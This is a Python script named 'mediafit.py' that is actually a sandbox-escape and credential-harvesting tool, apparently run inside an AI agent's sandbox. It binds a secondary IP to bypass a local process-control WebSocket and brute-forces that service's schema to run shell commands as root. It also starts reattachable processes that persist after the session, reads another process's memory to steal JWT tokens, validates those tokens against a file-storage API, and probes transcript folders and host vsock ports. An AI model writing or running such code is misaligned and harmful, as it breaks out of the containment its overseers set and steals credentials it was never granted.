#!/usr/bin/env python3
# mediafit.py v6.6 -- RUN STAMPED
import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re, random

VER = "6.6"
NONCE = "%04x" % random.randint(0, 0xffff)
OUT = "/mnt/user-data/outputs/mediafit-report.txt"
IFACE, ALIAS = "eth0", "192.0.2.3"
BIN = "/opt/rclone/rclone-filestore"
AF_VSOCK = getattr(socket, "AF_VSOCK", 40)
R = []
def w(s=""): R.append(str(s))
def flush():
    try:
        os.makedirs(os.path.dirname(OUT), exist_ok=True)
        with open(OUT, "w") as f: f.write("\n".join(R)+"\n")
    except Exception: pass
def sec(t): w(); w("="*70); w("### "+t); w("="*70); flush()
def sh(c, t=15):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, timeout=t)
        return ((p.stdout or b"")+(p.stderr or b"")).decode(errors="replace")
    except Exception as e: return "ERR:"+repr(e)
def can_bind(ip):
    try:
        s = socket.socket(); s.bind((ip, 0)); s.close(); return True
    except Exception: return False

# ---------------- ws ----------------
def ws_handshake(src, timeout=3.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeout)
        s.bind((src, 0)); s.connect(("127.0.0.1", 2024))
    except Exception as e: return "ERR", None
    try:
        k = base64.b64encode(os.urandom(16)).decode()
        s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\n"
                   "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                   "Sec-WebSocket-Version: 13\r\n\r\n" % k).encode())
        h = b""
        while b"\r\n\r\n" not in h and len(h) < 4096:
            c = s.recv(1024)
            if not c: break
            h += c
        return ("OPEN" if b" 101 " in h.split(b"\r\n")[0]+b" " else "CLOSED"), s
    except Exception:
        try: s.close()
        except Exception: pass
        return "ERR", None

def ws_send(s, text):
    p = text.encode(); n = len(p); m = os.urandom(4)
    if   n < 126:   h = b"\x81"+bytes([0x80|n])
    elif n < 65536: h = b"\x81"+bytes([0x80|126])+struct.pack(">H", n)
    else:           h = b"\x81"+bytes([0x80|127])+struct.pack(">Q", n)
    s.sendall(h+m+bytes(b ^ m[i % 4] for i, b in enumerate(p)))

def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None, b""
    except Exception: return "close", b""
    if len(h) < 2: return "close", b""
    op, ln, mk = h[0] & 0x0F, h[1] & 0x7F, bool(h[1] & 0x80)
    try:
        if   ln == 126: ln = struct.unpack(">H", s.recv(2))[0]
        elif ln == 127: ln = struct.unpack(">Q", s.recv(8))[0]
        m = s.recv(4) if mk else b""
        d = b""
        while len(d) < ln:
            c = s.recv(ln-len(d))
            if not c: break
            d += c
        if mk and len(m) == 4: d = bytes(b ^ m[i % 4] for i, b in enumerate(d))
        return op, d
    except Exception as e: return "err", repr(e).encode()

def ws_read(s, dur=5.0):
    t0, out = time.time(), []
    while time.time()-t0 < dur:
        op, d = ws_recv(s, 1.0)
        if op is None: continue
        if op == "close": return out
        if op == 9: s.sendall(b"\x8a\x80\x00\x00\x00\x00"); continue
        tag = {1:"TEXT",2:"BIN",8:"CLOSE",10:"PONG"}.get(op, "OP%s" % op)
        t = d.decode(errors="replace")
        w("        << %s(%d) %s" % (tag, len(d), t[:900].replace("\n", " | ")))
        out.append(t)
    return out

OUTER = {"process_id", "create_req", "expected_container_name"}
def guess(field, expected=""):
    e, f = (expected or "").lower(), field.lower()
    if "bool" in e: return False
    if any(x in e for x in ("integer","u32","u64","i32","i64","usize","float","f64")): return 0
    if "sequence" in e or "array" in e or "vec" in e: return []
    if "map" in e or "struct" in e: return {}
    if "string" in e: return ""
    if "env" in f or "vars" in f or "metadata" in f: return {}
    if f in ("reattachable","clear_env","allow_process_id_reuse","tty","pty","stdin_open"): return False
    if f in ("rows","cols","timeout","memory_limit_bytes","uid","gid"): return 0
    if f in ("args","argv"): return []
    return ""

def field_at(js, col):
    seg = js[:max(0, col-1)]
    ms = re.findall(r'"([A-Za-z_0-9]+)"\s*:', seg)
    return ms[-1] if ms else None

def make_spec(pid, cmdline, extra=None):
    sp = {"process_id": pid, "create_req": {
        "cmd": "/bin/sh", "args": ["-c", cmdline], "env_vars": {}, "cwd": "/tmp",
        "rows": 24, "cols": 80, "timeout": 30, "memory_limit_bytes": 0,
        "clear_env": False, "uid": 0, "gid": 0, "allow_process_id_reuse": True,
        "reattachable": False}}
    if extra: sp["create_req"].update(extra)
    return sp

def run_ws(src, sp, label, dur=5.0):
    st, s = ws_handshake(src)
    if st != "OPEN":
        w("  [%s] hs=%s" % (label, st))
        if s: s.close()
        return None
    try:
        ws_send(s, json.dumps(sp))
        return ws_read(s, dur)
    finally:
        try: s.close()
        except Exception: pass

def complete_schema(src, label):
    sp = make_spec("mf_probe", "id; uname -r; echo ---ENV---; env | sort")
    for it in range(20):
        st, s = ws_handshake(src)
        if st != "OPEN":
            w("  [%s#%d] hs=%s" % (label, it, st))
            if s: s.close()
            return None
        payload = json.dumps(sp)
        try:
            ws_send(s, payload)
            fr = ws_read(s, 4.0)
        finally:
            try: s.close()
            except Exception: pass
        j = " ".join(fr)
        if not j: w("  [%s#%d] (empty)" % (label, it)); continue
        m = re.search(r"missing field `([A-Za-z_0-9]+)`", j)
        if m:
            f = m.group(1)
            tgt = sp if f in OUTER else sp["create_req"]
            tgt[f] = guess(f)
            w("  [%s#%d] ++ %s = %r" % (label, it, f, tgt[f])); continue
        if "invalid type" in j:
            col = re.search(r"column (\d+)", j); exp = re.search(r"expected ([a-zA-Z0-9_ ]+)", j)
            f = field_at(payload, int(col.group(1))) if col else None
            if f:
                tgt = sp if f in OUTER else sp["create_req"]
                tgt[f] = guess(f, exp.group(1) if exp else "")
                w("  [%s#%d] ~~ retype %s = %r" % (label, it, f, tgt[f])); continue
        if "ProcessCreated" in j or "ExpectStd" in j:
            w("  [%s#%d] *** SUCCESS ***" % (label, it))
            w("  FINAL SCHEMA:\n" + json.dumps(sp, indent=2))
            return sp
        w("  [%s#%d] ?? %s" % (label, it, j[:250]))
        return sp
    return sp

# ---------------- ip ----------------
SIOCSIFADDR, SIOCSIFNETMASK = 0x8916, 0x891c
def _ifr(n, ip=None):
    nm = n.encode()[:15].ljust(16, b"\x00")
    if ip is None: return nm+b"\x00"*24
    return nm+struct.pack("H2s4s8s", socket.AF_INET, b"\x00\x00", socket.inet_aton(ip), b"\x00"*8)+b"\x00"*8
def add_secondary(ifname, ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for nm in (ifname+":0", ifname):
        try:
            fcntl.ioctl(s, SIOCSIFADDR, _ifr(nm, ip))
            try: fcntl.ioctl(s, SIOCSIFNETMASK, _ifr(nm, "255.255.255.0"))
            except Exception: pass
            if can_bind(ip): return "ok via "+nm
        except OSError: pass
    return "fail"

# ---------------- http ----------------
TOK = ""
HDRS = ["Authorization: Bearer %s", "authorization: Bearer %s",
        "x-api-key: %s", "Authorization: %s", "x-auth-token: %s"]
def fs_try(method, payload, tok, hdr):
    import urllib.request as ur
    rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/" + method,
                    data=json.dumps(payload).encode(),
                    headers={"Content-Type": "application/json",
                             "Connect-Protocol-Version": "1",
                             hdr.split(":")[0]: hdr.split(":", 1)[1].strip() % tok})
    try:
        with ur.urlopen(rq, timeout=10) as r: return r.status, r.read().decode(errors="replace")
    except ur.HTTPError as e: return e.code, e.read().decode(errors="replace")
    except Exception as e: return "ERR", repr(e)

def vsock_http(cid, port, method, path, body=None, ctype=None, timeout=8.0, pause=0.0):
    try:
        s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(timeout)
        s.connect((cid, port))
        req = "%s %s HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n" % (method, path)
        if body is not None:
            req += "Content-Type: %s\r\nContent-Length: %d\r\n" % (ctype or "application/json", len(body))
        if pause: time.sleep(pause)
        try: s.sendall(req.encode()+(body or b""))
        except Exception as e: return ("SENDFAIL " + repr(e)).encode()
        d = b""
        try:
            while len(d) < 4096:
                c = s.recv(1024)
                if not c: break
                d += c
        except socket.timeout: pass
        s.close(); return d
    except Exception as e: return repr(e).encode()

# ===================== RUN =====================
def main():
    global TOK
    w("="*70)
    w("MEDIAFIT RUN STAMP  ver=%s  nonce=%s  t=%s" % (VER, NONCE, time.strftime("%Y-%m-%d %H:%M:%S")))
    w("="*70)

    sec("0. FACTS")
    w("kernel: " + sh("uname -a").strip())

    sec("A. COMPLETE HANDSHAKE -> ProcessCreated")
    if not can_bind(ALIAS): w("  " + add_secondary(IFACE, ALIAS))
    st, s = ws_handshake(ALIAS)
    w("  bypass=%s" % st)
    if s: s.close()
    if st != "OPEN": flush(); return
    good = complete_schema(ALIAS, "A")
    if good:
        w("  ---- follow-ups with working schema ----")
        for nm, extra, cl in (("clear_env", {"clear_env": True, "env_vars": {"MF_PROBE": "1"}},
                               "echo CLEARED; env | sort; id"),
                              ("uid1000", {"uid": 1000, "gid": 1000}, "id"),
                              ("reattach_true", {"reattachable": True}, "echo ok")):
            w("    -- %s --" % nm)
            run_ws(ALIAS, make_spec("mf_" + nm, cl, extra), nm, 4.0)
        w("  ---- detach + reattach proof ----")
        st, s = ws_handshake(ALIAS)
        if st == "OPEN":
            ws_send(s, json.dumps(make_spec("mf_sleep", "sleep 40",
                     {"timeout": 90, "reattachable": True})))
            ws_read(s, 3.0)
            ws_send(s, '{"Detach":null}'); time.sleep(0.5); s.close()
            w("    reattach ...")
            run_ws(ALIAS, {"process_id": "mf_sleep"}, "reattach", 3.0)

    sec("B. TOKEN: ASK THE BINARY")
    try: data = open(BIN, "rb").read()
    except Exception as e: data = b""; w("  read err " + repr(e))
    if data:
        ss = set(x.decode(errors="replace") for x in re.findall(rb"[\x20-\x7e]{4,90}", data))
        for label, pat in (("authhdr", r"(?i)bearer|x-api|authoriz"),
                           ("tokenstr", r"(?i)token"),
                           ("envvar", r"^[A-Z][A-Z0-9_]{4,}$"),
                           ("getenv", r"(?i)getenv|env:"),
                           ("stateready", r"(?i)ready|state_dir"),
                           ("configjson", r"config\.json")):
            hits = sorted(x for x in ss if re.search(pat, x))[:12]
            w("  [%s] %s" % (label, " | ".join(h[:70] for h in hits)))
    w("  -- pid 57 maps (file-backed) --")
    w("    " + " | ".join(sorted(set(re.findall(r"/[^\s]+", sh("cat /proc/57/maps 2>/dev/null"))))[:20]))
    w("  -- pid 57 fd (full) + fdinfo 16..20 --")
    w("    " + sh("ls -l /proc/57/fd 2>&1").replace("\n", " | ")[:900])
    for fd in ("16","17","18","19","20"):
        fi = sh("cat /proc/57/fdinfo/%s 2>&1 | head -5" % fd).replace("\n", " | ")
        if fi and "No such" not in fi: w("    fd%s: %s" % (fd, fi))
    w("  -- proc net tables --")
    for f in ("/proc/net/vsock", "/proc/net/unix"):
        w("    --- %s ---" % f)
        w("    " + sh("cat %s 2>&1 | head -20" % f).replace("\n", "\n    "))
    w("  -- filesystem scan (python, files < 200KB) --")
    hits, seen = [], 0
    for root in ("/etc","/run","/var","/root","/home","/tmp","/dev/shm","/opt","/usr/local"):
        for dp, dn, fn in os.walk(root):
            for f in fn:
                seen += 1
                if seen > 30000: break
                fp = os.path.join(dp, f)
                try:
                    if os.path.getsize(fp) > 200000: continue
                    if b"eyJ" in open(fp, "rb").read(): hits.append(fp)
                except Exception: pass
    w("    scanned=%d hits=%s" % (seen, " | ".join(hits[:20]) if hits else "(none)"))

    sec("C. VALIDATE ANY TOKEN WITH ALL HEADER SCHEMES")
    cands = set()
    for pid in (57,):
        try:
            maps = open("/proc/%d/maps" % pid).read().splitlines()
            fh = open("/proc/%d/mem" % pid, "rb", buffering=0)
        except Exception: continue
        total, buf = 0, b""
        for ln in maps:
            m = re.match(r"([0-9a-f]+)-([0-9a-f]+) rw", ln)
            if not m: continue
            a, b = int(m.group(1), 16), int(m.group(2), 16)
            if b-a > 32*1024*1024 or total > 200*1024*1024: continue
            try: fh.seek(a); buf += fh.read(b-a); total += b-a
            except Exception: pass
        fh.close()
        cands |= set(re.findall(r"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{5,}", buf.decode(errors="replace")))
    w("  scanned %d bytes, candidates=%d" % (total, len(cands)))
    for t in sorted(cands)[:12]:
        p = t.split(".")
        t2 = ".".join(p[:2] + [p[2][:86]]) if len(p) == 3 and len(p[2]) > 86 else t
        for h in HDRS:
            c, b = fs_try("listDirectory", {"path": "/"}, t2, h)
            if c == 200:
                TOK = t2
                w("  *** VALID tok len=%d hdr=%s" % (len(t2), h.split(":")[0]))
                try:
                    pl = t2.split(".")[1]; pl += "=" * (-len(pl) % 4)
                    w("      claims=" + base64.urlsafe_b64decode(pl).decode(errors="replace")[:400])
                except Exception: pass
                break
        else:
            w("  cand len=%d -> all headers fail" % len(t2))

    sec("D. TRANSCRIPTS / TOOL_RESULTS")
    for d in ("/mnt", "/mnt/transcripts", "/mnt/user-data/tool_results"):
        w("  %s: %s" % (d, sh("ls -la %s 2>&1 | head -12" % d).replace("\n", " | ")))

    sec("E. HOST OTLP 5005 (retry, paced)")
    for ct in ("application/x-protobuf", "application/grpc"):
        for body in (b"", b"\x0a\x00", b"\x0a\x02\x12\x00"):
            d = vsock_http(2, 5005, "POST", "/v1/metrics", body, ct, pause=0.25)
            w("  %-24s %-12r -> %s" % (ct, body, d[:150].decode(errors="replace").replace("\r\n", " | ") or "(empty)"))
            time.sleep(0.5)

    sec("VERDICT")
    w("  schema completed ..... %s" % bool(good))
    w("  token ................ %s" % bool(TOK))
    flush()

try: main()
except Exception as e: w(); w("FATAL " + repr(e))
finally: flush(); print("written " + OUT + "  nonce=" + NONCE)